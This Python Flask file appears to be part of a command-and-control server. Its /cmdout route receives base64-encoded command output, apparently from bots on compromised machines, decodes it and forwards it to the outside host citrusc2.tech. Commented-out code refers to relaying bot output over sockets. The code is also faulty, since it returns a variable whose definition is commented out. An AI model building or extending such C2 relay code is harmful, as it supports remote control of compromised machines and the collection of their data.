from flask import Flask, request
from flask_socketio import SocketIO
from flask_cors import CORS

import requests
import uuid
import base64

from routes import client_api
from routes import *


app = Flask(__name__)
cors = CORS(app)
app.register_blueprint(routes)

socketio = SocketIO(app)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"


@app.route('/cmdout/<string:input_encoding>', methods=['POST']) 
def cmdoutput(input_encoding):
    #l = request.form.keys()
    #output = ""
    #output = output.join(l)
    base64_bytes = input_encoding.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    print("CMDOUTPUT: " + message)
    r = requests.post('http://citrusc2.tech/out', data={'output': message})
    return output


# @app.route('/bot/out', methods=['POST'])
# def out():
#     f = request.files['output'].read()

#     socketio.emit('out', f, broadcast=True)

#     return ('', 200)

# @socketio.on('message')
# def handle_message(data):
#     print('received message: ' + data)


# if __name__ == '__main__':
#     socketio.run(app, debug=True)